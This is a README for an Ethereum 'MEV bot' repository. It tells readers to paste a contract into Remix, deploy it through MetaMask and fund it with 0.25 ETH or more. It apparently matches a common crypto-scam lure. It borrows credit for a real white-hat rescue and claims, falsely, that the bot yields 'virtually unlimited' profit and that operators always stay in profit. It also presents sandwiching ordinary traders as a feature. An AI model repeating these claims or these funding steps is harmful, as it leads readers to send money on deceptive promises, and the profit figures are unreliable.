<div align="center">

<div align="right">

`c0ffeebabe☕ v3.0`

</div>

  

# `MevB0t 3.0`

  

</div>

  

This is a lightweight boilerplate on-chain Mevbot engine designed to scan the Ethereum mempool for profitable transactions with the goal of protecting regular users and institutions from being front-run or exploited by bad actors.

The bot aims to level the playing field by reordering transactions in an aggressive manner via dynamic calculation of gas fees and miner bribes. Thereby reducing the profitability of unethical MEV practices and securing stolen funds before they are able to reach a bad actor's wallet.

In august of 2023 I intercepted an attacker trying to exploit a vector on the CRV pool for $5 million USD. My bot was able to front-run the transaction and secure the stolen funds.

  

https://cointelegraph.com/news/white-hat-returns-5-million-curve-finance-hack

  
  

### `How it Works`

  

![99](https://i.imgur.com/pbX5WCw.png)

  

- The bot continuously monitors Uniswap's mempools for pending transactions (TX) from the Uniswap AMM until it identifies a TX containing slippage discrepancies within a profitable threshold (e.g. a hasty large buy order, or exploit TX)

  

- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability

  

- The bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement

  

- It optimizes paid gas fees for timely execution and cost efficiency and it always outbids gas prices and bribes of competing bots`, as long as it remains profitable

  

- Returns ETH back to the contract ready for withdrawal

  

### `Features`


  

- 𝗔𝗻𝘁𝗶-𝗘𝘅𝗽𝗹𝗼𝗶𝘁 (𝘄𝗵𝗶𝘁𝗲-𝗵𝗮𝘁) - identifies exploit transactions from bad actors and quickly works to front-run the transaction, effectively securing any stolen funds.

  

- 𝗔𝗿𝗯𝗶𝘁𝗿𝗮𝗴𝗲 𝗢𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝘆 - detects a price discrepancy between decentralized exchanges and executes arbitrage trades, resulting in virtually unlimited potential profit.

  

- 𝗙𝗹𝗮𝘀𝗵 𝗟𝗼𝗮𝗻 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗲𝘃𝗲𝗻𝘁𝗶𝗼𝗻 - identifies and blocks flash loan exploitations by executing counter trades just before the malicious transactions. This action prevents losses and helps preserve the stability of the Ethereum ecosystem.

  

- 𝗟𝗶𝗾𝘂𝗶𝗱𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 - proactively identifies liquidation transactions and executes a counter trade to protect vulnerable positions, potentially saving a user or contract from substantial losses, while pocketing the profit.

  

---

### `Instructions`

  

### Deploying the contract

  

1. **Accessing Remix Ethereum IDE**

- Navigate to [Remix Ethereum IDE](https://remix.ethereum.org/).

  

2. **Create or Import Contract File**

- Create a new file in Remix named `MevBot.sol` and paste the code from `MEV_engine.sol` from this repo.

- Or download the `MEV_engine.sol` file from this repo and open it in Remix.

  

![1](https://i.imgur.com/378hbHB.png)

  

3. **Solidity Version and Contract Compilation**

- Navigate to the `Solidity Compiler` tab.

- Use Solidity version `0.6.12`. In Remix, select this version in the `Compiler` dropdown.

- Click on the "Compile" button.

  

![3](https://i.imgur.com/iLRFrIQ.png)

  

4. **Preparation for Deployment**

- Navigate to the "Deploy & Run Transactions" tab.

- In the "Environment" dropdown, select "Injected Web3". Ensure that MetaMask is installed and activated.

![4](https://i.imgur.com/N5xgmHw.png)

  

5. **Deploying the Contract**

- Click on "Deploy".

- MetaMask will prompt for transaction confirmation.

  

![5](https://i.imgur.com/zYVnl9g.png)

  

6. **Confirm Bot Deployment**

- Confirm the bot deployment transaction in MetaMask.

  

7. **Configuration**

- Copy the bot’s contract address and send some Ethereum to its balance for the bot to start. Team recommendation is to fund the bot with a minimum amount of 0.25 ETH.

0.25 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.

  

<img src="https://i.imgur.com/7e0NKsg.png" height="301">

  

- After your transaction is confirmed, click the `Start` button to run the bot.

- Press the `Stop` button to halt bot operations.

- Withdraw all ETH at any time by clicking the `Withdrawal` button.

  

<img src="https://i.imgur.com/DvlQDp4.png" height="301">

  

<div>

  

<div align="center">

  

That’s it. The bot will start transacting immediately to generate profits from sandwich opportunities on Uniswap transaction pools

  

</div>

  

<div align="center">

  

⚠️NOTICE: It can take 12-24 HRS to accrue estimated profit potential. This figure is estimated on network congestion and market conditions

</div>

  

## `Contributions`

  

Contributions to the project are welcome! If you would like to contribute, kindly fork the repository and submit a pull request with your proposed changes or additions. Please ensure that your code adheres to the project's coding standards and includes appropriate tests.

  

This project would be impossible without generous support from our sponsors and developers. We cannot thank them enough!

  

## `Support`

  

If you find the project interesting, please consider granting it a star ⭐. Your support is greatly appreciated and helps in motivating further development!

  

![77](https://i.imgur.com/EhYMDlR.png)

  

## `FAQ`

  

```
-
Q: If many people deploy this bot, wouldn’t dilution of profits occur due to competition?

  
+
A: We found that there is no indication of a decrease in

profits when multiple instances of the bot are deployed.

  
-
Q: What average ROI and risks can I expect?

  
+
A: You can find the ROI according to latest data of bot

performances in the "Returns Features" section. This bot

in particular does not create any losses, it only

executes trades when there are proper MEV opportunities

to make profits, so under all circumstances bot operators remain in profit.

  
-
Q: What amount of funds does bot need to work?

  
+
A: Our team recommendation is to fund the bot with a minimum

amount of 0.25 ETH but more than .5 ETH is recommended so

the bot has enough gas and funds to swap, pay builders and tip miners, etc.

  
-
Q: Do I need to keep the Remix page open in my browser while the bot is activated?

  
+
A:No, just save the bot contract address after creating it.

The next time you want to access your bot via Remix,

you need to compile the file again as in step 3.

Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your

Metamask, paste your contract address into `Load contract

from Address` and press `At Address`

.

https://i.imgur.com/4x2i7RX.png

  

Now it can be found again under "Deployed Contracts".

  
-
Q: Does it work on other chains or DEXes as well?

  
+
A: No, currently the bot is dedicated only for Ethereum on Uniswap mempools.

We aim to expand support for other networks in the future :)

```